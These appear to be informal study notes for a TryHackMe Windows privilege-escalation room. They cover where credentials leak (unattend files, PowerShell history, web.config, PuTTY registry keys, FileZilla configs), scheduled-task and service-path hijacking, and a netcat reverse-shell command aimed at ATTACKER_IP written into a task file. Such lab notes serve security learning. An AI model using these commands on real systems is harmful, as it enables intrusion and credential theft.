* https://tryhackme.com/room/windowsprivesc20 (premium)

```
Misconfigurations on Windows services or scheduled tasks
Excessive privileges assigned to our account
Vulnerable software
Missing Windows security patches
```

* System are more perms that admin
* Windows Deployment Services: deploy an image to serveral hosts. These are refereed as Unattended, Admin account required to create them. Credentials

```
C:\Unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

* PowerShell's history: `type $Env:userprofile\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` and in a cmd `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
* List saved crendetials `cmdkey /list`. Run command as another user? `runas /savecred /user:admin cmd.exe`
* Internet Information Services (IIS) is the default web server on Windows installations.

```
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

* PuTTY `reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s`
* `schtasks /query /tn vulntask /fo list /v`: look for ones in which we can inject/modify the binary
* Start task manually `schtasks /run /tn vulntask` (CTF)
* `icacls c:\tasks\schtask.bat`: check permissions (F=Full Access)
* (cmd) `echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > task.bat`
* Windows installer files (-f msi -o malicious.msi)
* Windows services are managed by the Service Control Manager (SCM).
* `sc qc` (ahah, my steel moutain)
* IN A EFFING CMD BITCH (otherwise: sc.exe)
* Unquoted Service Paths
  * If there are space in the executable space
  * and there is an executable that can be created in the path of the service
  * then the executable will be executed with the rest of the path as arguments
  * AD and WD privileges, allowing the user to create subdirectories and files
  * https://askubuntu.com/questions/1075098/remmina-scaling-options
* Insecure Service Permissions
* XXX
* https://tryhackme.com/room/windowsprivesc20 (dropped fur now)
* XXX
* Moar
  * https://github.com/bitsadmin/wesng
  * https://blog.bitsadmin.com/blog/windows-security-updates-for-hackers
  * https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
  * https://github.com/gtworek/Priv2Admin
  * https://github.com/antonioCoco/RogueWinRM
  * https://jlajara.gitlab.io/Potatoes_Windows_Privesc
  * https://decoder.cloud/
  * https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf
  * https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at C:\Program Files\FileZilla Server\FileZilla Server.xml
or C:\xampp\FileZilla Server\FileZilla Server.xml
. These can be MD5 hashes or in plaintext, depending on the version.